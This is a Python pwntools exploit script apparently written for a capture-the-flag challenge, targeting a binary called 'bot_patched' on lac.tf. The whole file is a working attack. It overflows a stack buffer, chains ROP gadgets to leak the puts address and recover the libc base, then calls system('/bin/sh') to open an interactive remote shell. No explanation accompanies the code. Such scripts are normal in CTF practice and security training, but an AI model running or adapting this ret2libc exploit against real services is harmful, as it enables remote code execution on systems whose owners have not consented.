#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./bot_patched')
libc = ELF('libc.so.6')

host = args.HOST or 'lac.tf'
port = int(args.PORT or 31180)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

context.terminal = ['xfce4-terminal','-e']
gdbscript = '''
b *main+336
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

OFFSET = cyclic_find(0x6161616161616861, n=8)

print(OFFSET)

rop = ROP(exe)

rop.rdi = p64(exe.got['puts'])
rop.puts()
rop.main()

print(rop.dump())

payload = b'give me the flag\0'
payload += b'A' * OFFSET
payload += rop.chain()
# payload += p64(exe.plt['puts'])
# payload += p64()

io.sendline( payload)

io.recvline()
io.recvline()
leak = u64(io.recvline().strip().ljust(8,b'\0'))

libc.address = leak - libc.sym['puts']

log.success(f'{libc.address = :x} {libc.sym["system"] = :x}')

rop = ROP([exe, libc])

rop.rdi = p64(next(libc.search(b'/bin/sh\0')))
# rop.system()

payload = b'give me the flag\0'
payload += b'A' * OFFSET
payload += rop.chain()
payload += p64(libc.sym['system'])

io.sendline( payload)

io.interactive()

